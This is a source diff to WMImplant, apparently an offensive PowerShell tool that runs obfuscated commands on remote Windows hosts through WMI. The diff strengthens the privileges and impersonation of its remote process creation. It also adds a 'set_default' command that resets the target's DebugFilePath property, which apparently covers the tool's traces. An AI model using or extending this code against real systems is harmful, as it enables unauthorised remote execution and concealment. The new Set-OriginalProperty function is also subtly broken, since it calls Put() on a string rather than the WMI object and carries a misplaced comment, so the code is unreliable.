@@ -80,11 +80,11 @@ function Invoke-WMIObfuscatedPSCommand
         # Launch PowerShell command.
         if($Creds)
         {
-            $null = Invoke-WmiMethod -Class Win32_Process -Name Create -Argumentlist $ObfuscatedCommand -Credential $Creds -ComputerName $Target
+            $null = Invoke-WmiMethod -Class Win32_Process -EnableAllPrivileges -Impersonation 3 -Authentication Packetprivacy -Name Create -Argumentlist $ObfuscatedCommand -Credential $Creds -ComputerName $Target
         }
         else
         {
-            $null = Invoke-WmiMethod -Class Win32_Process -Name Create -Argumentlist $ObfuscatedCommand -ComputerName $Target
+            $null = Invoke-WmiMethod -Class Win32_Process -EnableAllPrivileges -Impersonation 3 -Authentication Packetprivacy -Name Create -Argumentlist $ObfuscatedCommand -ComputerName $Target
         }
 
         # Delete environment variable containing PowerShell command if $ObfuscateWithEnvVar flag was defined.
@@ -818,6 +818,19 @@ function Invoke-CommandGeneration
         "gen_cli"
         {
             Throw "You are already generating a command!"
+        }
+
+        "set_default"
+        {
+            if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
+            {
+                $Command = "`nInvoke-WMImplant -command set_default -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
+            }
+            else
+            {
+                $Command = "`nInvoke-WMImplant -command set_default -Target $GenTarget`n"
+            }
+            $Command
         }
 
         "help"
@@ -2857,6 +2870,27 @@ function Invoke-WMImplant
                     }
                 }
 
+                "set_default"
+                {
+                    if(!$Target)
+                    {
+                        Throw "You need to specify a target to run the command against!"
+                    }
+
+                    Foreach($Computer in $Target)
+                    {
+                        if($RemoteCredential)
+                        {
+                            Set-OriginalProperty -Creds $RemoteCredential -Target $Computer
+                        }
+
+                        else
+                        {
+                            Set-OriginalProperty -Target $Computer
+                        }
+                    }
+                }
+
                 "ps"
                 {
                     if(!$Target)
@@ -3214,7 +3248,8 @@ function Show-WMImplantMainMenu
     $menu_options += "====================================================================`n"
     $menu_options += "change_user - Change the user used to connect to remote systems`n"
     $menu_options += "exit - Exit WMImplant`n"
-    $menu_options += "gen_cli - Generate the CLI command to execute a command via WMImplant.`n"
+    $menu_options += "gen_cli - Generate the CLI command to execute a command via WMImplant`n"
+    $menu_options += "set_default - Set default value od DebugFilePath property`n"
     $menu_options += "help - Display this help/command menu`n`n"
 
     $menu_options += "File Operations`n"
@@ -3295,6 +3330,19 @@ function Use-MenuSelection
             "gen_cli"
             {
                 Invoke-CommandGeneration
+            }
+
+            "set_default"
+            {
+                if ($Credential)
+                {
+                    Set-OriginalProperty -Creds $Credential
+                }
+
+                else
+                {
+                    Set-OriginalProperty
+                }
             }
 
             "help"
@@ -4154,6 +4202,42 @@ function Invoke-LSWMImplant
             Get-WmiObject -Class Win32_Directory -Filter $filter -ComputerName $Target
             Get-WMIObject -Class CIM_Datafile -filter $filter -ComputerName $Target
         }
+    }
+    end{}
+}
+
+function Set-OriginalProperty
+{
+    # This function retrieves a diretory listing of all files from a user-specified directory on the targeted system
+    param
+    (
+        #Parameter assignment
+        [Parameter(Mandatory = $False)]
+        [System.Management.Automation.PSCredential]$Creds,
+        [Parameter(Mandatory = $False)]
+        [string]$Target
+    )
+
+    Process
+    {
+        if(!$Target)
+        {
+            $Target = Read-Host "What system are you targeting? >"
+            $Target = $Target.Trim()
+        }
+
+        $default_prop_value = "%SystemRoot%\Memory.dmp"
+        # Set original WMI Property Value
+        if($Creds)
+        {
+            $Original_WMIProperty = (Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target -Credential $Creds).DebugFilePath
+        }
+        else
+        {
+            $Original_WMIProperty = (Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target).DebugFilePath
+        }
+        $Original_WMIProperty.DebugFilePath = $default_prop_value
+        $Original_WMIProperty.Put()
     }
     end{}
 }
